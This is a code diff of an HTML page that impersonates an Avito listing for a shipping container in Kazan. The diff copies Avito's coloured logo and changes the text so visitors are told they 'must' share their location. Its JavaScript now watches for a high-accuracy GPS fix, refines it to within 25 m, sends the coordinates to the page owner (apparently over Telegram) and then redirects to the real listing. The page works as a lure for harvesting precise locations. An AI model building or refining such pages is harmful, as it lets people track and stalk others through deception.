@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -32,11 +31,16 @@
     }
 
     .logo {
-      color: #e64a19;
       font-size: 27px;
       font-weight: bold;
       margin-bottom: 20px;
     }
+
+    .logo .a { color: #168bca; }
+    .logo .v { color: #20a56b; }
+    .logo .i { color: #f5bd32; }
+    .logo .t { color: #f28a24; }
+    .logo .o { color: #ed5b35; }
 
     h2 { font-size: 21px; line-height: 1.3; }
 
@@ -87,17 +91,11 @@
       color: #333;
     }
 
-    .footer {
-      text-align: center;
-      color: #888;
-      font-size: 12px;
-      margin-top: 18px;
-    }
-
     #coordinates {
       overflow-wrap: anywhere;
       font-weight: bold;
       color: #222;
+      line-height: 1.6;
     }
 
     #status {
@@ -109,13 +107,21 @@
       display: none;
       margin-top: 20px;
     }
+
+    .accuracy {
+      color: #168bca;
+    }
   </style>
 </head>
 
 <body>
   <main class="container">
     <div class="card">
-      <div class="logo">А · Avito</div>
+
+      <div class="logo">
+        <span class="a">А</span> ·
+        <span class="v">A</span><span class="i">v</span><span class="t">i</span><span class="o">t</span><span class="a">o</span>
+      </div>
 
       <h2>Морской контейнер. 20 и 40 футов</h2>
       <p>Казань · Объявление на Avito</p>
@@ -125,13 +131,12 @@
       <h2>Перед переходом к объявлению</h2>
 
       <p>
-        Перед переходом к объявлению вы должны поделиться своим местоположением.
+        Вы должны поделиться своим местоположением.
       </p>
 
       <div class="notice">
-        <strong>Передача геопозиции</strong><br>       
-        При подтверждении координаты будут отправлены
-        владельцу страницы. 
+        <strong>Передача геопозиции</strong><br>
+        При подтверждении координатов будут отправлены владельцу страницы.
         Вы можете отказаться и перейти к объявлению без отправки.
       </div>
 
@@ -162,6 +167,10 @@
       "https://www.avito.ru/kazan/oborudovanie_dlya_biznesa/morskoy_konteyner._20_i_40_futov_4033413795?businessModeForceEnabled=true&utm_campaign=native&utm_medium=item_page_ios&utm_source=soc_sharing";
 
     let currentCoordinates = null;
+    let watchId = null;
+    let timeoutId = null;
+    let bestAccuracy = Infinity;
+    let isFinished = false;
 
     const allowButton = document.getElementById("allow");
     const sendButton = document.getElementById("send");
@@ -170,7 +179,46 @@
     const coordinatesElement = document.getElementById("coordinates");
     const statusElement = document.getElementById("status");
 
+    function stopWatching() {
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+
+      if (timeoutId !== null) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+      }
+    }
+
+    function finishLocation() {
+      if (isFinished) return;
+
+      isFinished = true;
+      stopWatching();
+      allowButton.disabled = false;
+
+      if (!currentCoordinates) {
+        statusElement.textContent =
+          "Не удалось определить местоположение. Проверьте настройки геолокации и попробуйте ещё раз.";
+        return;
+      }
+
+      coordinatesElement.innerHTML =
+        "Широта: " + currentCoordinates.latitude.toFixed(6) +
+        "<br>Долгота: " + currentCoordinates.longitude.toFixed(6) +
+        '<br><span class="accuracy">Заявленная точность: ±' +
+        Math.round(currentCoordinates.accuracy) + " м</span>";
+
+      confirmSection.style.display = "block";
+      allowButton.style.display = "none";
+
+      statusElement.textContent =
+        "Измерение завершено. Проверьте координаты перед отправкой.";
+    }
+
     skipButton.addEventListener("click", () => {
+      stopWatching();
       window.location.href = avitoUrl;
     });
 
@@ -182,42 +230,84 @@
       }
 
       allowButton.disabled = true;
-      statusElement.textContent = "Определяем местоположение...";
+      confirmSection.style.display = "none";
+      statusElement.textContent =
+        "Определяем местоположение. Поиск может занять до 60 секунд...";
 
-      navigator.geolocation.getCurrentPosition(
+      currentCoordinates = null;
+      bestAccuracy = Infinity;
+      isFinished = false;
+
+      watchId = navigator.geolocation.watchPosition(
         (position) => {
-          currentCoordinates = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
+          const coords = position.coords;
 
-          coordinatesElement.textContent =
-            "Широта: " + currentCoordinates.latitude +
-            " | Долгота: " + currentCoordinates.longitude;
+          if (
+            Number.isFinite(coords.latitude) &&
+            Number.isFinite(coords.longitude) &&
+            Number.isFinite(coords.accuracy) &&
+            coords.accuracy > 0 &&
+            coords.accuracy < bestAccuracy
+          ) {
+            bestAccuracy = coords.accuracy;
 
-          confirmSection.style.display = "block";
-          allowButton.style.display = "none";
-          statusElement.textContent =
-            "Местоположение определено. Отправка ещё не выполнялась.";
+            currentCoordinates = {
+              latitude: coords.latitude,
+              longitude: coords.longitude,
+              accuracy: coords.accuracy
+            };
+
+            statusElement.textContent =
+              "Получено измерение. Заявленная точность: ±" +
+              Math.round(bestAccuracy) +
+              " м. Продолжаем определение...";
+          }
+
+          if (bestAccuracy <= 25) {
+            finishLocation();
+          }
         },
-        () => {
+
+        (error) => {
+          if (currentCoordinates) {
+            finishLocation();
+            return;
+          }
+
+          stopWatching();
+          isFinished = true;
           allowButton.disabled = false;
-          statusElement.textContent =
-            "Не удалось определить местоположение. Можно перейти на Avito без отправки.";
+
+          if (error.code === 1) {
+            statusElement.textContent =
+              "Доступ к геолокации не разрешён.";
+          } else if (error.code === 2) {
+            statusElement.textContent =
+              "Устройство не смогло определить местоположение.";
+          } else {
+            statusElement.textContent =
+              "Не удалось получить координаты за отведённое время.";
+          }
         },
+
         {
           enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
+          maximumAge: 0,
+          timeout: 60000
         }
       );
+
+      timeoutId = setTimeout(() => {
+        finishLocation();
+      }, 60000);
     });
 
     sendButton.addEventListener("click", async () => {
       if (!currentCoordinates) return;
 
       sendButton.disabled = true;
-      statusElement.textContent = "Отправляем координаты в Telegram...";
+      statusElement.textContent =
+        "Отправляем подтверждённые координаты...";
 
       try {
         const response = await fetch("/send-location", {
@@ -238,6 +328,7 @@
           "Координаты отправлены. Переходим к объявлению...";
 
         window.location.href = avitoUrl;
+
       } catch (error) {
         sendButton.disabled = false;
         statusElement.textContent =
